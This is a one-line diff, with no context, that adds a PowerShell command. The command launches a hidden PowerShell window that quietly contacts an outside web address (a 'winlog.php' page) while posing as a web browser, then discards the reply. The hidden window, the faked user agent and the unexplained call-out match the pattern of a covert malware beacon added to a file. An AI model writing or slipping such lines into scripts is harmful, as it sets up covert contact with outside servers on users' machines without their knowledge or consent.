@@ -1,0 +1,1 @@
+Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://www.ecluzelles.fr/js/winlog.php' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -UseBasicParsing | Out-Null`""
